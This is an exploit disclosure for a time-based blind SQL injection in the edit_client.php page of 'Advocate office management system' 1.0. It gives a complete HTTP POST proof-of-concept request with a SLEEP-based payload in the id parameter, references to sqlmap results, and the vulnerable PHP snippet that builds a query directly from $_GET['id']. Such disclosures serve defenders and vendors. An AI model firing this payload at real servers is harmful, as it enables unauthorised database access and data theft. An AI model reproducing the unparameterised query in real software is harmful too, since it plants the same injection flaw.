### Exploit Title: Advocate office management system - edit_client.php sql injection vulnerability

### Date: 2024-09/29

### Exploit Author: Peanut886

### Vendor Homepage: https://www.sourcecodester.com

### Software Link: https://www.sourcecodester.com/download-code?nid=17280&title=Advocate+office+management+system+free+download

### Version: 1.0

### Tested on: windows10 + phpstudy

# **SQL injection vulnerability in edit_client.php**
---
## Sample request POC #1

```
POST /control/edit_client.php?id=1%27%20AND%20(SELECT%202935%20FROM%20(SELECT(SLEEP(5)))AjHa)%20AND%20%27fFpD%27=%27fFpD HTTP/1.1
Host: 192.168.67.12:8080
Content-Length: 856
Cache-Control: max-age=0
Origin: http://192.168.67.12:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNDRbJMBlVLkG1VdH
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.67.12:8080/control/edit_client.php?id=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=muh68rfntf7p7uq2mqohb1hqln
Connection: close

------WebKitFormBoundaryNDRbJMBlVLkG1VdH
Content-Disposition: form-data; name="id"

1
------WebKitFormBoundaryNDRbJMBlVLkG1VdH
Content-Disposition: form-data; name="name"

John Doe
------WebKitFormBoundaryNDRbJMBlVLkG1VdH
Content-Disposition: form-data; name="gender"

Male
------WebKitFormBoundaryNDRbJMBlVLkG1VdH
Content-Disposition: form-data; name="dob"

1990-05-15
------WebKitFormBoundaryNDRbJMBlVLkG1VdH
Content-Disposition: form-data; name="email"

john.doe@example.com
------WebKitFormBoundaryNDRbJMBlVLkG1VdH
Content-Disposition: form-data; name="mobile"

1234567890
------WebKitFormBoundaryNDRbJMBlVLkG1VdH
Content-Disposition: form-data; name="address"

123 Main St, City, Country
------WebKitFormBoundaryNDRbJMBlVLkG1VdH
Content-Disposition: form-data; name="Edit"


------WebKitFormBoundaryNDRbJMBlVLkG1VdH--

```
![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240929-Advocate%20office%20management%20system%20-%20edit_client.php%20sql%20injection%20vulnerability/edit_client.php(bp).jpg "Advocate office management system")

## Sqlmap running results #1

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240929-Advocate%20office%20management%20system%20-%20edit_client.php%20sql%20injection%20vulnerability/edit_client.php(sqlmap).jpg "Advocate office management system")

## Related Codes edit_client.php

```php
 if(isset($_GET['id'])){
	$uid = $_GET['id']; 
	 // echo "connect $uid";
 
	$sql = "select * from clients where id='$uid'";
	$result = $conn->query($sql);
	
	if($result->num_rows > 0){
		$row = $result->fetch_array();
		// print_r($row);
		// exit;
	} 
 }
```
